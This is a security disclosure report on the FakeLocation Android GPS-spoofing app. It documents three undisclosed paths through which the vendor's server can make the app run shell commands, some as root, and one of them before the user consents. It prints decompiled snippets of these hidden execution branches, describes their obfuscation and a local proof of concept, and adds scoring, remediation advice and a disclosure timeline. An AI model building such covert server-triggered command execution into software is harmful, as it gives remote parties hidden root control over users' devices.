# FakeLocation: execution of server-supplied shell commands not disclosed to users

Reporter: [tyldx](https://github.com/tyldx) · tyldx@proton.me · 2026-11 · revision 1.7

## 1. Summary and related work

FakeLocation is an Android app for simulating the device's GPS location and routes; an optional ROOT mode requires the user to grant root access. The app contains server-controlled command execution that is not disclosed to users: through three paths (numbered in section 4), the server can make the app run arbitrary shell commands; two of them run through `su`, and one fires before the user accepts the first-run consent dialog. Neither the privacy policy nor the user agreement discloses this capability (section 3.1).

All 9 versions examined (1.3.1.6 through 1.5.2; see section 2) are affected, and the capability has existed since August 2022 at the latest. Score: 8.3 (CVSS v3.1) / 9.0 (v4.0). Certificate pinning prevents an arbitrary network attacker from triggering these paths by man-in-the-middle; the only parties able to trigger them are the developer and anyone who compromises its server or steals its key (see section 5). From 1.3.10 on, the relevant code exists only in a runtime-decrypted dex.

The vendor has acknowledged that this interface exists and overuses the su permission, and stated that su usage will be removed in an upcoming version and that the user agreement and privacy policy will be improved; its stated purpose (controlling pirated or cracked builds) has not been independently verified.

### 1.1 Related work

The following public analyses predate this report. It makes no claim of first discovery.

- [1] 二师兄, "安卓逆向 —— Fake Location 授权分析以及后门分析" (Android reverse engineering: Fake Location licensing and backdoor analysis), Zhihu, 2025-02-28, https://zhuanlan.zhihu.com/p/26927292194 (archive: https://archive.today/dXwZ4). Analyzes licensing and injection in official-site 1.3.5 BETA, corresponding to the system_server-side connection in section 8; its claim that this connection can execute server-sent commands has not been verified by this report.
- [2] AkiyamaMIO123, "FakeLocation 1.5.0 后门分析" (FakeLocation 1.5.0 backdoor analysis), 52pojie, 2026-07-14, https://www.52pojie.cn/thread-2117178-1-1.html (archive: https://archive.today/UAaES). Analyzes official-site/GitHub 1.5.0 and reports the `code==10000` branches corresponding to paths 2 and 3 here, and the build-expiry mechanism.
- [3] BlueFunny, "Fake Location 1.5.2 高危后门分析" (Fake Location 1.5.2 high-risk backdoor analysis), LINUX DO, 2026-09-03, https://linux.do/t/topic/2847507 (original could not be archived; archive of an identical copy on locdd.com: https://archive.today/tLlTl). Statically analyzes official-site/GitHub 1.5.2 and reports the branch corresponding to path 2 and its startup trigger.

This report adds: path 1; runtime verification of paths 1 and 2; the Play build; the version range 1.3.1.6 through 1.5.2; and the certificate-pinning and trigger-party analysis.

## 2. Affected product

- Name: Fake Location (Google Play title "Fake Location - Mock GPS&Route").
- Two builds:
  - Official-site / GitHub build: package `com.lerist.fakelocation` (code flavor = CN), distributed via the official site fakeloc.cc/app and GitHub Releases (Lerist/FakeLocation). The GitHub channel was publicly inaccessible as of 2026-11-07; archives: repository https://archive.today/sTqGt, 1.5.2 release https://archive.today/zABCC (others in `evidence/archive-urls.md`).
  - Play build: package `dev.lerist.fakelocation`, distributed on Google Play (50K+ installs, as of 2026-11-05).
- Developer: Lerist / Chengdu Lanyi Technology Co., Ltd. (成都览一科技有限公司).
- Versions examined: 1.3.1.6 (versionCode 1569, official-site/GitHub build), 1.3.2.1 (1579), 1.3.2.2 (1584), 1.3.2.3 (1585), 1.3.5 (1588), 1.3.5-beta (1593), 1.3.10 (1673) (1.3.2.1 through 1.3.10 are Play builds), 1.5.0 (1700 official-site/GitHub, 1701 Play), and 1.5.2 (1702, both builds), all confirmed affected.
  - 1.3.1.6 was released on GitHub Releases on 2022-08-24 (UTC+8) (archives in `evidence/archive-urls.md`); 1.3.2.1 is the earliest version available on APKPure. Some versions have no archive, so the version sequence has gaps. Older 1.2.x samples (1.2.0.6 through 1.2.1.2, 2020) were not examined. Other public releases in the 1569-1702 range were not individually examined and are presumed affected. APKPure listing dates: `evidence/apkpure-versions-2026-11-07.png`.
- Signing certificates: `b55e7f6ccb63318b2cc4d3c45e6b148131061a2acd0a82725fe59e118d1ddafc` (CN=Lerist., O=成都览一科技有限公司; all official-site/GitHub builds, and old Play <= 1.3.5-beta); `d9ad7175f80ebed780b0c7c61b7c788827ad4d1953e0381feddd2fa0431f0362` (CN=Lerist., O=Lerist). From 1.3.10 the Play build uses APK Signature Scheme v3.1 key rotation: d9ad for API 33 and above, b55e still for API 24-32.
- Sample SHA-256 (earliest version examined and both 1.5.2 builds; all hashes in `hashes/`):

  | Version | Channel | Sample | SHA-256 |
  |---|---|---|---|
  | 1.3.1.6 | Official-site/GitHub (CN) | FakeLocation_CN_v1.3.1.6_1569_20220824071825.apk | `4ac9a5c8a38beddc6f8a38101f0bff5c7bd0f6582c36c6e41c48e81bba0be1cc` |
  | 1.5.2 | Official-site/GitHub (CN) | single apk (site == GitHub) | `5d2a2bad585e3d50c38621a002bcf7a8e0dcf5448fc045f58619fe7a491eaea1` |
  | 1.5.2 | Play | base.apk (app bundle) | `a4fa13cd318d6ad392bd6033a93e40bac5ac1eff90b65d7c526033aa8f679d24` |

## 3. Weakness type

- Primary: CWE-912 Hidden Functionality. This class requires no finding of intent, only that the functionality is undocumented, outside the specification, and not reachable through an obvious interface.
- Related: CWE-506 Embedded Malicious Code. Combined with the packing, string encryption, split command strings, and silent execution, the functionality has the characteristics of a backdoor; whether it is malicious is a judgment of intent, so this report relies on observable facts and treats this class as secondary.

### 3.1 Non-disclosure and scope of consent

- Not authorized: neither the privacy policy, the user agreement, nor the terms disclose remote command execution. The only clause touching server-side control is the "Blocked apps list" (user agreement clause 5.3), which in the Chinese version reads (our translation): "we have the right to proactively identify known high-risk applications (APPs) that are prone to being used for illegal or fraudulent purposes, infringing third-party rights, or violating other applications' terms of service, take technical measures to block their functionality, and update the 'List of Blocked APPs' accordingly; blocked applications (APPs) will not be able to use this software's mock data" - limited to disabling the mock feature, not executing shell/root commands. The ROOT warning only states that granting root lowers device security, not that the app executes server-sent commands. This functionality is therefore outside the scope of what the user consents to.
- Archives: privacy policy https://archive.today/OK0Jk (2026-11-04); user agreement https://archive.today/PlS7t (Chinese, 2026-11-06) and https://archive.today/Iulzs (English, 2026-11-04); terms of use https://archive.today/MyhhH (2026-11-04); download page https://archive.today/ZMnTg (2026-11-04).

## 4. Technical detail: server-controlled command-execution paths

Obfuscated names are from the decompilation of each version: the runtime-decrypted dex from 1.3.10 on and for official-site/GitHub 1.3.1.6, the APK itself for earlier Play builds. Play 1.5.2 names are given first, with the official-site/GitHub build's equivalents. All three paths share one command sink (Play `fv2.ළ(String[] cmds, boolean su, boolean b)` / official-site/GitHub build `z41`, `C13588.m51168`):

```java
Process p = Runtime.getRuntime().exec(su ? "su" : "sh");  // command written via stdin
```

The paths appear in different versions: path 2 (config endpoint `app/getAppConfigs`) is already present in the earliest version examined, 1.3.1.6, where the 10000 branch appears only in the config callback, based on static analysis and not dynamically triggered; path 1 (getNotices) was introduced between 1.3.5-beta (listed on APKPure on 2024-11-10) and 1.3.10 (2025-10-31); path 3 is found only in the official-site/GitHub build.

### 4.1 Path 1: getNotices -> sh (both builds)

The notice class (Play `com.lerist.lib.notice.C6073` / official-site/GitHub build `C11241`) in the getNotices response callback:

```java
String s = response.body().string();
if (s.startsWith("10000:")) {
    Runtime.getRuntime().exec(new String[]{"sh", "-c", s.substring(6)});
}
// s is then parsed as the notice JSON; for "10000:..." this throws and is swallowed by catch
```

Endpoint `POST https://notice.api.fakeloc.cc:4430/Notice/getNotices`, requested during the app's startup loading. Its response is evaluated for `startsWith("10000:")` as soon as it arrives. Execution reads no output, writes no log, and swallows exceptions.

### 4.2 Path 2: generic callback code==10000 -> su + sh (both builds)

The synchronous callback (Play `C3685.m13605`) handling the Retrofit response wrapper, failure branch:

```java
int code = resp.getCode();
String message = resp.getMessage();
if (code == 10000 && !TextUtils.isEmpty(message)) {
    fv2.<exec>(message, /*su=*/true,  ...);  // run as su
    fv2.<exec>(message, /*su=*/false, ...);  // run as sh
}
```

One endpoint handled by this synchronous callback (su+sh) is `POST /FakeLocation/goods/getRenewalGoodsList` (requested when the renewal page is opened). The official-site/GitHub build's synchronous callback is `C5901.m19381`, same semantics.

An asynchronous variant handles other endpoints, including the version check `version/checkApkUpdate`. That request is sent unconditionally from `MainActivity.onCreate`, in the same function as path 1's getNotices (official-site/GitHub build `MainActivity.C11127.m44656`). How the asynchronous variant executes depends on the build:

- Play 1.5.2 (`C3685.AbstractC3687.m13609`, callback `C5946`): runs sh only on `code==10000`, as the app uid (root reachability: see section 5).
- Official-site/GitHub build (`C5901.AbstractC5903.mo959`, callback `C11075`) and Play 1.5.0 and earlier (e.g. 1.5.0 `C4606.AbstractC4608`): same as the synchronous callback, running the command once via su and once via sh, so it runs as root at startup.

The version-check callback re-sends the request after 5 seconds on any error code other than 2002, and `code==10000` takes that branch; if the server keeps returning 10000, each response executes the command again. Under sustained injection on official-site/GitHub 1.5.2, it ran about every 6 to 8 seconds.

The config endpoint `app/getAppConfigs` also uses the asynchronous variant (official-site/GitHub build `C3440.m14629`, callback `C3445`; Play `C3071.m12188`, callback `C3076`), executing as described above for each build. It is requested from `Application.onCreate` (main process only) via `lv0.m5558` (Play `hj2.m2797`), before any Activity; its only precondition is a native integrity check (`SwipeUtils.isQualified`). On failure or `code==10000` it also retries after 5 seconds.

The config callbacks of the examined versions from 1.3.1.6 (official-site/GitHub build, callback `C1829$C1830`, static analysis only) through 1.3.10 (e.g. 1.3.5-beta `C3301`, 1.3.10 `C2360`) run the command once via su and once via sh on `code==10000`, and are likewise requested from `Application.onCreate`.

### 4.3 Path 3: blocklist polling ver/vfs code==10000 -> su + sh (official-site/GitHub build only)

A background thread (`RunnableC13518`, started by `C13538.m51102` once the app's ROOT mode is activated) enters a loop 20 to 50 seconds after start and wakes every 2 to 7 minutes, but only sends `POST ver/vfs` to fetch the list of packages barred from mock location when the cached list is empty or older than 24 hours, normally about once a day; when the response has `code==10000 && message not empty`:

```java
C13588.m51168(new String[]{message}, /*su=*/true,  true);  // su
C13588.m51168(new String[]{message}, /*su=*/false, true);  // sh
```

A `code==10000` response does not fill the list, so the next iteration requests again and the server can keep delivering commands.

### 4.4 Transport and concealment

- Servers: business `api.fakeloc.cc:4430`, notices `notice.api.fakeloc.cc:4430`, ads `ads.api.fakeloc.cc:4430`; on connection failure the client falls back to matching hosts under `lerist.dev`. Same in both builds.
- Mutual TLS (`xp0.m10346`, BKS, password hardcoded). The trust store `tp.png` pins the server to a Lerist self-signed certificate (fingerprint `60:5C:2B...`), whose private key is NOT in the app; it is the store's only entry, and system trust anchors are not merged in (checked on CN 1.5.2). The client keystore `tl.png` holds the client private key (fingerprint `F1:11:05...`, usable only to impersonate a client). When these stores load, the business client's `HostnameVerifier` always returns true, but certificate trust validation still applies, so this is only a latent weakness.
- `tp.png` is byte-identical across both builds, and the same trust store is byte-identical back to 1.3.1.6 (named `transparent.png` / `translucent.png` before 1.3.10), so the conclusion in section 5 on who can trigger these paths applies to all affected versions.
- Concealment: from 1.3.10 on, the business code exists only in a runtime-decrypted dex, invisible when unpacking the APK directly; strings are XOR-encrypted; sensitive commands are split and concatenated; no logging, exceptions swallowed. Official-site/GitHub 1.5.0 uses the 360 packer; 1.5.2 shows no 360 packer traces and uses a different packer; the Play build uses a custom loader. Among earlier versions, official-site/GitHub 1.3.1.6 is already 360-packed with su/sh still in plaintext; the Play builds examined are not packed.

## 5. Impact and scoring

- Any party able to make these endpoints return the above directives can run arbitrary shell commands on devices with an affected version installed; paths 2 and 3 run as root when the app holds root (the app's ROOT mode requires the user to grant root), and commands delivered via path 1 can call su themselves to obtain root (inferred from root managers granting by app uid; not live-tested).
- Path 1 fires automatically at startup, with no user action beyond launching the app; on every build examined except Play 1.5.2, path 2 (config request) also fires at startup and runs through su; together with path 1, every build, Play 1.5.2 included, can run commands as root on every launch for users who have granted root.
- Because of certificate pinning and because the server's private key is not in the app, an arbitrary third party cannot trigger these three HTTPS paths via a network man-in-the-middle. This conclusion is based on static analysis and does not cover the system_server-side connection in section 8. The parties who can trigger it are: the developer (holding the server private key and running the server), or anyone who compromises Lerist's server or steals its server private key. This functionality is therefore controllable by the developer and also creates a supply-chain single point of failure: a breach of the vendor's infrastructure yields RCE and privilege escalation across the affected install base.
- CVSS, scored per path. Shared v3.1 prefix `AV:N/AC:H/PR:N` (the command is delivered over the network and requires control of the certificate-pinned server); the root paths carry v4.0 `AT:P` because root must already have been granted; `UI:R` / `UI:P` because the user must launch the app (path 3: activate ROOT mode).

  | Path (variant) | CVSS v3.1 | CVSS v4.0 |
  |---|---|---|
  | 1: sh, app uid (no root grant) | `AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H` = **7.5** | `CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` = **7.7** |
  | 1: root granted (command calls su itself; inferred) | `AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H` = **8.3** | `CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:P/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` = **9.0** |
  | 2: su/root | `AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H` = **8.3** | `CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:P/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` = **9.0** |
  | 3: su/root, official-site/GitHub only (ROOT mode activated; background poll) | `AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H` = **8.3** | `CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:P/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` = **9.0** |

  Path 2: official-site/GitHub & Play ≤1.5.0 fire at startup; Play 1.5.2 requires opening the renewal page, its startup config/version-check being sh only, with startup root via path 1.

  Overall **8.3 (v3.1, High) / 9.0 (v4.0, Critical)**, reached by paths 2 and 3 and by path 1 when root is granted. `S:C` / `SC:SI:SA:H` reflect escape to root once root is granted. Path 2's startup route through the version check is live-tested (see 6), so the top score does not depend on the static-only path 3.

### 5.1 Assessment of the vendor's response

- The targeting the vendor claims (pirated or cracked versions only; see section 10) would be applied server-side; the client code contains no limitation restricting these paths to pirated builds, so the targeting claim cannot be confirmed from the client (based on the analysis in section 4).
- The vendor did not mention removing the shell interface itself; with su removed alone, path 1 and the sh branches of paths 2 and 3 would still execute server-supplied commands; as long as the app keeps a root grant, those commands can still obtain root (inferred; see the start of section 5), so removing su from the app's code alone does not eliminate root-level execution (based on section 4).

## 6. Proof of concept

Method: an LSPosed module hooks `BaseDexClassLoader` constructors to locate the decrypted OkHttp classes, then hooks `okhttp3.internal.http.RealInterceptorChain.proceed` and, after the original response returns, rewrites the response body by request URL, triggering the app's own command-execution branches. The original request is still sent; neither the vendor's server nor the app is modified; payloads use only `id` (including `id -u`) and output redirection. Test device Pixel 9 (KernelSU).

| Build | Path | Trigger | Key output | Verified |
|---|---|---|---|---|
| Play 1.5.2 | 1 (sh) | getNotices response rewritten to `10000:id>...` | `uid=10358(u0_a358) ... untrusted_app_34` (app uid) | Live |
| Play 1.5.2 | 2 (su) | renewal page opened -> `goods/getRenewalGoodsList` rewritten to `{"code":10000,...}` | `uid=0(root) ... u:r:ksu:s0` | Live |
| Official-site/GitHub 1.5.2 | 1 (sh) | getNotices rewritten | `uid=10355(u0_a355) ... untrusted_app_27` (app uid) | Live |
| Official-site/GitHub 1.5.2 | 2 (su) | `goods/getRenewalGoodsList` rewritten | `uid=0(root)` | Live |
| Official-site/GitHub 1.5.2 | 2 (su+sh) | `version/checkApkUpdate` rewritten to `code==10000` | `uid=0(root) ... u:r:ksu:s0`; sh as `uid=10355(u0_a355)` | Live |
| Official-site/GitHub 1.5.2 | 3 (su) | not triggered | shares the command sink and `code==10000` mechanism with path 2 | Static only |

- Path 1: on the first launch after clearing app data (`pm clear`), the command executed while the consent dialog was still on screen and the user had not accepted it.
- The version check on official-site/GitHub 1.5.2 was tested separately: root output occurred while the consent dialog was on screen (the device had already granted the app root, which `pm clear` does not revoke); a separate run recorded both root and app-uid sh output (see `poc/results/cn_checkapkupdate_preconsent_root.txt`, `cn_checkapkupdate_consent_screen.png`, and `cn_checkapkupdate_su_sh_proof.txt`). The module variant used for the version-check runs was not kept; the published `poc/` source is the baseline.
- The config request `getAppConfigs` was not tested separately; its su+sh branch remains supported by static analysis.
- Path 3 was not live-driven; the reason and the limits of the experiment records are in `poc/results/RESULTS.md`.

Boundary: this is a client-side demonstration (the response is injected locally), proving the client executes server-controlled commands; it does not prove the vendor's server currently sends them. The primary evidence is the static code branches in section 4. The vendor has acknowledged that this interface exists (for its stated use, see section 10).

## 7. Reproduction and forensics

- Runtime dex extraction: read `/proc/<pid>/maps` for the decrypted dex regions -> dd them out -> split by dex header (size at offset 32, class_defs at offset 96) -> decompile with jadx. XOR string decode: `plain[i] = a[i] ^ b[i % len(b)]`.

## 8. Other behavior not disclosed to users (corroborating, non-core)

Server-controlled: a remote-kill branch (account-sync callback, official-site/GitHub build `ba2`) runs `kill -9 <own pid>` then `System.exit(0)` on `code == 9999`; and a dex injected into system_server (`C0084`/`C0036`, official-site/GitHub build, not confirmed for Play) opens a non-TLS TCP connection (with application-layer encryption) to `vef.api.fakeloc.cc:12309` (falling back to `vef.fl.api.lerist.dev` after 30 minutes disconnected, then hardcoded IP `141.164.37.97` after 1 hour) and stops mocking on a `NOPASS.` reply, or when a connection fails more than 24 hours after the last successful connection and no `pass.` has been received. The Zhihu article [1] states that older versions can run server-sent commands over this connection; this report has not confirmed that and did not perform dynamic verification.

Local self-protection (official-site/GitHub build only): an anti-tamper routine (`RunnableC13526`) may soft-reboot, reboot the device, or exit on a files-directory hash mismatch; an APK-integrity check (`C13595.m51176`) throws on mismatch; and a build-expiry mechanism (build timestamp + 200 days; 1.5.2 expires 2027-03-08 (UTC+8), 1.5.0 expired in late October 2026) stops path 3, injection, and init after expiry. Paths 1 and 2 are not gated by any of these.

## 9. User remediation

- Uninstall 1.5.2 and earlier versions (the earliest affected version examined is 1.3.1.6; earlier versions were not examined). For later versions, check the vendor's fix status and this report's updates before continuing to use them.
- Revoke any root previously granted to the app.
- If an affected version was run on a root-granted device, treat the device as potentially having received commands, and assess accordingly (check for anomalies, reset if warranted).

## 10. Related public records and disclosure timeline

- 2025-02-28: A third party published related analysis of official-site 1.3.5 BETA on Zhihu (see 1.1 [1]).
- 2026-07-14: A third party published related analysis of official-site/GitHub 1.5.0 on 52pojie (see 1.1 [2]).
- 2026-09-03: A third party published related analysis of official-site/GitHub 1.5.2 on LINUX DO (see 1.1 [3]).
- 2026-11-05: CVE requested from MITRE; report published; reported to Google Play (policy against downloading or executing server-controlled code) and GitHub (a release distributing a binary with this functionality undisclosed to users), to Google through the Android Security Malware Report Form, and to CNCERT by email.
- 2026-11-05: Vendor notified by email after publication and asked whether it will request a CVE ID. The `code==10000` branch had been publicly analyzed since 2026-07 (see 1.1), with no public vendor response or fix observed up to this report's publication.
- 2026-11-06: Vendor replied; assessment in 5.1.
  - Acknowledged: the shell interface exists and overuses the su permission; and stated that su usage will be removed in an upcoming version and that the user agreement and privacy policy will be improved (disclosure status of both documents: section 3.1).
  - Stated but not independently verified: that the interface was intended to control pirated or cracked versions and that only a long sleep command is currently sent to those versions.
- 2026-11-06: Reporter followed up by email, asking the vendor to confirm: (1) whether the upcoming version removes server-supplied shell execution entirely or only su; (2) which version will contain the fix and when it will be released; (3) whether the vendor will request a CVE ID from the MITRE CNA of Last Resort.
- 2026-11-07: Report revised (1.3). Affected range extended to 1.3.2.1 through 1.5.2; added that the startup config request and version check run through su before user consent, with a live test on official-site/GitHub 1.5.2; corrected details on polling frequency, anti-tamper, and signing. Correction: earlier revisions (1.0-1.2) stated that versions 1.3.5-beta and earlier were not affected; that conclusion was incorrect: path 2 (the config endpoint `app/getAppConfigs`) is present from 1.3.2.1, the earliest version examined.
- 2026-11-07: Report revised (1.6.1). Withdrew the two 1.6 conclusions on the system_server-side connection in older versions and their score: the relevant code is not in this report's materials and could not be independently confirmed.
- 2026-11-07: The vendor's GitHub profile (Lerist) and repository (Lerist/FakeLocation) were observed to be publicly inaccessible; GitHub's public API indicates the username still maps to an account that is hidden from public view. The cause has not been confirmed by GitHub. The repository had previously been archived; GitHub showed an archive date of 2026-08-20.
- 2026-11-08: Report revised (1.6.7). Added official-site/GitHub 1.3.1.6 (static analysis): path 2 is present, the lower bound of the affected range is now 1.3.1.6, and the capability dates to August 2022 at the latest. Correction: the earlier statement that all examined versions before 1.3.10 are not packed holds only for Play builds; 1.3.1.6 is already 360-packed.
- 2026-11-09: Report revised (1.7). Correction: each path requires the user to open the app or activate ROOT mode, so the user-interaction metric changes from `UI:N` to `UI:R` / `UI:P`, and the overall score from 9.0 / 9.5 to 8.3 / 9.0.
